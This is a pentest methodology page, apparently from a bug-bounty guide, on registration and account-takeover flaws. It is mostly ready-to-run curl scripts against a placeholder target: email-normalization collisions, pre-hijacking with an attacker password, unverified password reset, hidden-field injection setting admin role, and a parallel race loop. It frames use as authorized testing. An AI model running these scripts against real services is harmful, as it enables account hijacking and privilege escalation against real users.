---
title: "Registration & Takeover Vulnerabilities"
description: "Identity confusion, unverified accounts, and logic flaws that let an attacker pre-hijack or steal an account at signup."
phase: Web
order: 66
tags:
  - registration
  - account-takeover
  - identity
  - logic
tools:
  - curl
  - jq
  - ffuf
updated: 2026-10-01
---

A registration abuse runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find an identity mismatch at signup that lets you pre-hijack or take over an account, proving it with accounts you control.

## 1. Map the signup and verification flow

```bash
curl -s -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"me1@test.com","password":"Passw0rd!"}' | jq .
curl -s "https://target.com/api/me" -H "Cookie: session=$SESSION" | jq .
```

Note how email is normalized, whether verification is required, and what state an unverified account holds.

## 2. Test identifier normalization

```bash
for e in "me@test.com" "Me@test.com" "me+1@test.com" "me@test.com." \
         "me@googlemail.com" "me@test.com%00"; do
  printf '%s -> ' "$e"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$e\",\"password\":\"Passw0rd!\"}"
done
```

If two variants share a row or collide on uniqueness, you can squat an identity.

## 3. Pre-account takeover

```bash
curl -s -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim-canary@test.com","password":"AttackerPass1!"}' | jq .
curl -s "https://target.com/api/me" -H "Cookie: session=$SESSION" | jq .
```

Check whether a real verification or SSO attach later inherits attacker-controlled state.

## 4. Unverified password reset

```bash
curl -s -X POST "https://target.com/api/password/forgot" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim-canary@test.com"}' | jq .
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim-canary@test.com","token":"<token>","password":"NewPass1!"}' | jq .
```

## 5. Logic flaws at signup

```bash
# Hidden field injection
curl -s -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"me2@test.com","password":"x","isVerified":true,"role":"admin"}' | jq .

# Parallel duplicate registration
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"dup@test.com","username":"admin"}' &
done; wait
```

Also jump straight to the final step of a multi-step flow.

## 6. Confirm ownership impact

- Verify which account owns the identifier after each collision.
- Confirm the target owner would inherit attacker state on first login.
- Use canary addresses only; never register a real user's email beyond scope.

## Full pipeline

```bash
B="https://target.com/api"
curl -s -X POST "$B/register" -H "Content-Type: application/json" \
  -d '{"email":"me1@test.com","password":"Passw0rd!"}' | jq .
for e in "me@test.com" "Me@test.com" "me+1@test.com" "me@test.com."; do
  printf '%s -> ' "$e"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$B/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$e\",\"password\":\"Passw0rd!\"}"
done
curl -s -X POST "$B/register" -H "Content-Type: application/json" \
  -d '{"email":"victim-canary@test.com","password":"AttackerPass1!"}' | jq .
curl -s -X POST "$B/register" -H "Content-Type: application/json" \
  -d '{"email":"me2@test.com","password":"x","isVerified":true,"role":"admin"}' | jq .
for i in $(seq 1 10); do
  curl -s -X POST "$B/register" -H "Content-Type: application/json" \
    -d '{"email":"dup@test.com","username":"admin"}' &
done; wait
```

## Ethics & legality

- Only register with canary addresses and accounts you own.
- Do not leave pre-hijack state on a real user's account; delete your test accounts.
- Never attempt to authenticate as a real victim; prove the flaw up to the state change.
- Stop the race loop once the duplicate is demonstrated.
